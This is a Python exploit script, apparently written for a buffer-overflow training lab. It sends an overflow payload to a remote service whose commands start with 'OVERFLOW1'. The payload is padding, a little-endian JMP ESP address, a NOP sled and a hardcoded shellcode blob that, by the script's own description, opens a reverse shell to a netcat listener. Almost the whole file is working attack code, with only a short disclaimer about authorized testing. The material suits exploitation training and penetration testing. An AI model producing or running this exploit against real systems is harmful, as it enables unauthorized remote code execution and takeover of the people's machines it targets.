#!/usr/bin/env python3

import sys
import subprocess
import socket
import argparse
import itertools
import struct
from typing import Optional

def main(ip: str, port: int, eip_offset: int, overflow_threshold: int, jmp_address: hex) -> None:
	if eip_offset > overflow_threshold:
		print("The value of the offset cannot be bigger than the overflow threshold")
		sys.exit(0)
	
	# Define prefix and buffer with encoded cyclic pattern
	prefix = b"OVERFLOW1 "	# CHANGE
	buffer = b"A" * eip_offset
	eip = struct.pack('<I', jmp_address) # Transforms 0x625011AF into \xAF\x11\x50\x62
	shellcode =  b""
	shellcode += b"\xdd\xc4\xd9\x74\x24\xf4\x5a\x2b\xc9\xbb\x20"
	shellcode += b"\xc8\x8d\x14\xb1\x52\x31\x5a\x17\x03\x5a\x17"
	shellcode += b"\x83\xca\x34\x6f\xe1\xf6\x2d\xf2\x0a\x06\xae"
	shellcode += b"\x93\x83\xe3\x9f\x93\xf0\x60\x8f\x23\x72\x24"
	shellcode += b"\x3c\xcf\xd6\xdc\xb7\xbd\xfe\xd3\x70\x0b\xd9"
	shellcode += b"\xda\x81\x20\x19\x7d\x02\x3b\x4e\x5d\x3b\xf4"
	shellcode += b"\x83\x9c\x7c\xe9\x6e\xcc\xd5\x65\xdc\xe0\x52"
	shellcode += b"\x33\xdd\x8b\x29\xd5\x65\x68\xf9\xd4\x44\x3f"
	shellcode += b"\x71\x8f\x46\xbe\x56\xbb\xce\xd8\xbb\x86\x99"
	shellcode += b"\x53\x0f\x7c\x18\xb5\x41\x7d\xb7\xf8\x6d\x8c"
	shellcode += b"\xc9\x3d\x49\x6f\xbc\x37\xa9\x12\xc7\x8c\xd3"
	shellcode += b"\xc8\x42\x16\x73\x9a\xf5\xf2\x85\x4f\x63\x71"
	shellcode += b"\x89\x24\xe7\xdd\x8e\xbb\x24\x56\xaa\x30\xcb"
	shellcode += b"\xb8\x3a\x02\xe8\x1c\x66\xd0\x91\x05\xc2\xb7"
	shellcode += b"\xae\x55\xad\x68\x0b\x1e\x40\x7c\x26\x7d\x0d"
	shellcode += b"\xb1\x0b\x7d\xcd\xdd\x1c\x0e\xff\x42\xb7\x98"
	shellcode += b"\xb3\x0b\x11\x5f\xb3\x21\xe5\xcf\x4a\xca\x16"
	shellcode += b"\xc6\x88\x9e\x46\x70\x38\x9f\x0c\x80\xc5\x4a"
	shellcode += b"\x82\xd0\x69\x25\x63\x80\xc9\x95\x0b\xca\xc5"
	shellcode += b"\xca\x2c\xf5\x0f\x63\xc6\x0c\xd8\x86\x1c\x18"
	shellcode += b"\x85\xff\x20\x24\xa4\xa3\xad\xc2\xac\x4b\xf8"
	shellcode += b"\x5d\x59\xf5\xa1\x15\xf8\xfa\x7f\x50\x3a\x70"
	shellcode += b"\x8c\xa5\xf5\x71\xf9\xb5\x62\x72\xb4\xe7\x25"
	shellcode += b"\x8d\x62\x8f\xaa\x1c\xe9\x4f\xa4\x3c\xa6\x18"
	shellcode += b"\xe1\xf3\xbf\xcc\x1f\xad\x69\xf2\xdd\x2b\x51"
	shellcode += b"\xb6\x39\x88\x5c\x37\xcf\xb4\x7a\x27\x09\x34"
	shellcode += b"\xc7\x13\xc5\x63\x91\xcd\xa3\xdd\x53\xa7\x7d"
	shellcode += b"\xb1\x3d\x2f\xfb\xf9\xfd\x29\x04\xd4\x8b\xd5"
	shellcode += b"\xb5\x81\xcd\xea\x7a\x46\xda\x93\x66\xf6\x25"
	shellcode += b"\x4e\x23\x16\xc4\x5a\x5e\xbf\x51\x0f\xe3\xa2"
	shellcode += b"\x61\xfa\x20\xdb\xe1\x0e\xd9\x18\xf9\x7b\xdc"
	shellcode += b"\x65\xbd\x90\xac\xf6\x28\x96\x03\xf6\x78"
	nops = b"\x90" * 16 

	payload = b""
	payload_size = eip_offset + len(eip) + len(shellcode) + len(nops)

	if payload_size > overflow_threshold:
		print("The Overflow Threshold is too small, it should have a minimum value of:", eip_offset + len(eip) + len(shellcode) + len(nops))
		sys.exit(0)

	suffix = b"C" * (overflow_threshold - payload_size)

	timeout = 5
	try:
		# Create socket object
		with socket.socket() as s:
			# Connect to target server
			s.connect((ip, port))

			# Set Timeout
			#s.settimeout(timeout)

			# Print server banner
			try:
				while True:
					response = s.recv(4096)
					print(f"{response.decode()}")
			except:
				pass

			# Send data to the server
			payload = b"".join(
				[
					prefix,
					buffer,
					eip,
					nops,
					shellcode,
					suffix
				]
			)
			print(f"Sending payload...")
			s.send(payload)

			response = s.recv(4096)
			# Print the response from the server
			print(f"Response: {response.decode()}")

	except ConnectionError:
		print('Connection Refused')
		sys.exit(0)
	except:
		print("\n","="*25,"CRASH","="*25,"\n")
		print(payload)
		print(f"Application crashed at {len(payload) - len(prefix)} bytes!")
		sys.exit(0)

if __name__ == "__main__":
	# Parse command line arguments
	parser = argparse.ArgumentParser(
		prog="Nop Sleds",
		description="""This is a Python script for executing a buffer overflow on a target service of a remote server. 
	The script takes five arguments: an IP address, a port number, the EIP offset, an overflow threshold and the address of the JUMP ESP intruction which does not have correct protection applied. 
	After launching a local netcat listener to the port described in the payload we should be able to get a shell on the target server.
	It is intended for use in a controlled testing environment and should not be used to target production systems or networks without proper authorization.""",
		epilog="Have fun experimenting with this tool!"
	)
	parser.add_argument("ip", help="IP address of the target")
	parser.add_argument("port", type=int, help="Port number of the target")
	parser.add_argument("offset", help="Number of bytes inside the buffer until reaching the return address")
	parser.add_argument("overflow_threshold", help="Payload size which is able to crash the target application")
	parser.add_argument("jmp_esp", help="Address of the JMP ESP instruction we uncovered with Mona (ex: 0x625011AF)")
	args = parser.parse_args()

	# Call main function
	main(args.ip, args.port, int(args.offset), int(args.overflow_threshold), int(args.jmp_esp,16))